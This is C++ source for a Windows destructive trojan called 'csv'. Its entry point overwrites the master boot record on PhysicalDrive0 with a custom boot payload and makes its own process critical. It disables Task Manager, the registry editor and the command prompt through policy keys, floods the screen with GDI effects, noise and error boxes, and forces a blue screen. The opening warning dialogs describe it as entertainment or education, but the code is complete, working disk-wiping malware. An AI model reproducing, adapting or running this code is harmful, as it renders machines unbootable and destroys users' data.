#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0xC1, 0x7D,
0xBF, 0x20, 0x14, 0x2E, 0xAD, 0x91, 0xBB, 0xF0, 0x00, 0xD1, 0xE1, 0xB8, 0x18, 0x37, 0x73, 0x03,
0xB8, 0x38, 0x02, 0xE8, 0x22, 0x00, 0x01, 0xDF, 0x83, 0xEB, 0x10, 0x72, 0x4F, 0xE8, 0x18, 0x00,
0x29, 0xDF, 0x83, 0xEF, 0x08, 0xEB, 0xE2, 0xAD, 0x97, 0xAD, 0x84, 0xE4, 0x93, 0xB0, 0x30, 0x50,
0xC6, 0x44, 0xFF, 0x02, 0xE8, 0xAE, 0x00, 0x58, 0x50, 0x53, 0x51, 0x57, 0x50, 0xBB, 0x79, 0x7D,
0x2E, 0xD7, 0x93, 0xB9, 0x08, 0x00, 0x88, 0xF8, 0xD0, 0xE3, 0x72, 0x02, 0x31, 0xC0, 0x80, 0xFF,
0x10, 0x72, 0x07, 0x80, 0x3D, 0x0E, 0x74, 0x98, 0x32, 0x05, 0xAA, 0xE2, 0xE9, 0x81, 0xC7, 0x38,
0x01, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xD5, 0x5F, 0x59, 0x5B, 0x58, 0xC3, 0x81, 0xC7, 0x88, 0x09,
0x81, 0xFE, 0xEB, 0x7D, 0x75, 0x8D, 0xB1, 0x05, 0xB8, 0x02, 0x00, 0x2E, 0xA5, 0xAB, 0xE2, 0xFB,
0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x04, 0xFA, 0x74, 0xF6, 0x89, 0x16, 0x04, 0xFA, 0xB4, 0x01,
0xCD, 0x16, 0xB4, 0x00, 0x74, 0x02, 0xCD, 0x16, 0x88, 0xE0, 0x3C, 0x01, 0x75, 0x02, 0xCD, 0x20,
0x2C, 0x48, 0x72, 0x0C, 0x3C, 0x09, 0x73, 0x08, 0xBB, 0xF5, 0x7D, 0x2E, 0xD7, 0xA2, 0xFE, 0xF9,
0xBE, 0x20, 0xE6, 0xAD, 0x97, 0xAD, 0x93, 0x31, 0xC0, 0xE8, 0x2B, 0x00, 0x80, 0x36, 0xFF, 0xF9,
0x80, 0xB8, 0x28, 0x0E, 0x78, 0x07, 0xA0, 0x22, 0xE6, 0xB1, 0x03, 0xD2, 0xE0, 0xE8, 0x68, 0xFF,
0xBD, 0x37, 0x7C, 0xB7, 0x21, 0xFF, 0xD5, 0xB7, 0x2E, 0xFF, 0xD5, 0xB7, 0x28, 0xFF, 0xD5, 0xB7,
0x34, 0xFF, 0xD5, 0xEB, 0x9B, 0x74, 0x03, 0xE8, 0x4E, 0xFF, 0x89, 0xF8, 0x31, 0xD2, 0xB9, 0x40,
0x01, 0xF7, 0xF1, 0x88, 0xD4, 0x08, 0xC4, 0x80, 0xE4, 0x07, 0x75, 0x5A, 0xB5, 0x37, 0x38, 0x6D,
0xFF, 0x10, 0xE4, 0x38, 0xAD, 0x00, 0x0A, 0x10, 0xE4, 0x38, 0x6D, 0x08, 0x10, 0xE4, 0x38, 0xAD,
0xC0, 0xFE, 0x10, 0xE4, 0x84, 0xFF, 0x74, 0x2B, 0xF6, 0xC3, 0x05, 0x74, 0x0C, 0x3B, 0x16, 0x00,
0xFA, 0xB0, 0x02, 0x72, 0x0C, 0xB0, 0x08, 0xEB, 0x08, 0x3C, 0x00, 0xB0, 0x04, 0x72, 0x02, 0xB0,
0x01, 0x84, 0xC4, 0x75, 0x23, 0x88, 0xD8, 0x84, 0xC4, 0x75, 0x1D, 0xD0, 0xE8, 0x75, 0xF8, 0xB0,
0x08, 0xEB, 0xF4, 0x89, 0x16, 0x00, 0xFA, 0x2E, 0xA2, 0x3A, 0x7D, 0xA0, 0xFE, 0xF9, 0x84, 0xC4,
0x75, 0x06, 0x20, 0xDC, 0x74, 0x1A, 0x88, 0xD8, 0x88, 0x44, 0xFE, 0xA8, 0x05, 0xBB, 0x80, 0xFD,
0x75, 0x03, 0xBB, 0x02, 0x00, 0xA8, 0x0C, 0x74, 0x02, 0xF7, 0xDB, 0x01, 0xDF, 0x89, 0x7C, 0xFC,
0xC3, 0x00, 0x42, 0xE7, 0xE7, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xFC, 0xF0, 0xF0, 0xFC, 0x7E,
0x3C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x7E, 0xFF, 0xFF, 0xE7, 0xE7, 0x42,
0x00, 0x3C, 0x7E, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xDB, 0xDB, 0xFF, 0xFF, 0xFF,
0xA5, 0x00, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x3C, 0x7E, 0x3F, 0x0F, 0x0F, 0x3F, 0x7E,
0x3C, 0x00, 0x00, 0xFE, 0x7F, 0x02, 0x42, 0x02, 0x42, 0xFF, 0x7F, 0x40, 0x42, 0x7E, 0x7E, 0x02,
0x02, 0x7F, 0x02, 0xC0, 0x03, 0x40, 0x02, 0x7F, 0x02, 0x40, 0x02, 0xFE, 0x7F, 0x02, 0x42, 0xFF,
0x7B, 0x40, 0x0A, 0x7E, 0x7E, 0x02, 0x40, 0xFF, 0x7F, 0x00, 0x00, 0x98, 0xAA, 0x90, 0x50, 0x98,
0x64, 0xA0, 0x3C, 0xA8, 0x50, 0x01, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x04, 0x55, 0xAA
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI shader1(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (int)((i ^ 4) + (i * 4) * sqrt(y ^ x * i));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI swirl(LPVOID lpParam) {
    int sw = GetSystemMetrics(0);
    int sh = GetSystemMetrics(1);
    int xSize = sh / 10, ySize = 9;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        SelectObject(hdcMem, brush);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, 0x1900AC010E);
        for (int i = 0; i < sh * 2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdcMem, brush);
            BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, 0x1900AC010E);
            DeleteObject(brush);
        }
        for (int i = 0; i < sw * 2; i++) {
            int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdcMem, brush);
            BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, 0x1900AC010E);
            DeleteObject(brush);
        }
        BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, 0x1900AC010E);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
    }
}

DWORD WINAPI textout(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HFONT hfnt = CreateFontA(rand() % 50, rand() % 50, 0, 0, FW_THIN, 1, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        LPCSTR things[] = {
            "csv", "AMOGUS!", "what have you done!",
            "this is the end!", "goodbye, stupid user!"
        };
        int thing = rand() % _countof(things);
        SetTextColor(hdc, Hue(239));
        TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HWND wnd = GetDesktopWindow();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmp = { 40, w, h, 1, 24 };
    PRGBTRIPLE rgbtriple;
    while (true) {
        hdc = GetDC(0);
        HDC mdc = CreateCompatibleDC(hdc);
        HBITMAP hbit = CreateDIBSection(hdc, &bmp, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(mdc, hbit);
        BitBlt(mdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            rgbtriple[i].rgbtRed += 5;
            rgbtriple[i].rgbtGreen += 10;
            rgbtriple[i].rgbtBlue += 15;
        }
        BitBlt(hdc, 0, 0, w, h, mdc, 0, 0, SRCCOPY);
        ReleaseDC(wnd, hdc);
        DeleteDC(hdc); DeleteDC(mdc); DeleteObject(hbit); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&w); DeleteObject(&h); DeleteObject(&bmp);
    }
}

DWORD WINAPI patblt(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, PATINVERT);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader3(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                FLOAT fx = ((y + (i * 4)) ^ (x - y));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCCOPY);
        ReleaseDC(NULL, hdc); DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI pixels(LPVOID lpvd) {
    HDC hdc = GetDC(0);
    HDC mdc = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    HBITMAP hbit = CreateCompatibleBitmap(hdc, w, h);
    SelectObject(mdc, hbit);
    while (true) {
        hdc = GetDC(0);
        SetStretchBltMode(mdc, COLORONCOLOR);
        SetStretchBltMode(hdc, COLORONCOLOR);
        StretchBlt(mdc, 0, 0, w / 9, h / 9, hdc, 0, 0, w, h, SRCCOPY);
        StretchBlt(hdc, 0, 0, w, h, mdc, 0, 0, w / 9, h / 9, SRCCOPY);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
    return 0x00;
}

DWORD WINAPI lines(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        LineTo(hdc, rand() % (0 - w), 0);
        LineTo(hdc, rand() % (0 - w), h);
        Sleep(10);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    int ticks = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 1;; i++, i %= 21) {
        if (!i) for (int c = 0; c < 100; c++) InvalidateRect(0, 0, 0);
        HDC hdc = GetDC(0);
        HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0; BYTE bt = 0;
        if ((GetTickCount() - ticks) > 60000)
            bt = 2 + rand() & 255;
        for (int i = 1; w * h > i; i++) {
            if (i % h == 0 && rand() % 100 == 0)
                v = 3 + rand() % 50;
            ((BYTE*)(data + i))[v % 3] += ((BYTE*)(data + bt))[bt] ^ i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcMem);
        DeleteObject(hdc);
        ReleaseDC(0, hdc);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t >> 8 - t ^ t >> 5 - t ^ t << 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(127 * ((t ^ t >> 12) * t >> 8));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 1 & t >> 8 & 73 & t >> 3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (-t != 0) buffer[t] = static_cast<char>(t >> t / ((t >> 12 & 3) + 6));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 24000, 24000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[24000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t ^ t >> 7) * (t | t >> 9) + (t | t << 9) + (t | t >> 5)) / 1000);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI fake(LPVOID lpParam) {
    MessageBoxW(NULL, L"Fatal error: 0x083420uf", L"Windows", MB_ICONERROR);
    return 0;
}

DWORD WINAPI msg(LPVOID lpParam) {
    while (true) {
        MessageBoxW(NULL, string(), L"csv", MB_ICONERROR);
    }
    return 0;
}

DWORD WINAPI cur1(LPVOID lpParam) {
    while (true) {
        POINT cpt;
        GetCursorPos(&cpt);
        int x = cpt.x, y = cpt.y;
        SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
        Sleep(10);
        SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
        Sleep(10);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as csv that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"csv", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"csv", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            CreateThread(0, 0, fake, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(4000);
            CreateThread(0, 0, msg, 0, 0, 0);
            Sleep(1000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, cur1, 0, 0, 0);
            HANDLE thread2 = CreateThread(0, 0, swirl, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread3dot1 = CreateThread(0, 0, patblt, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            TerminateThread(thread3dot1, 0);
            CloseHandle(thread3dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, pixels, 0, 0, 0);
            HANDLE thread4dot2 = CreateThread(0, 0, lines, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader4, 0, 0, 0);
            sound5();
            Sleep(30000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}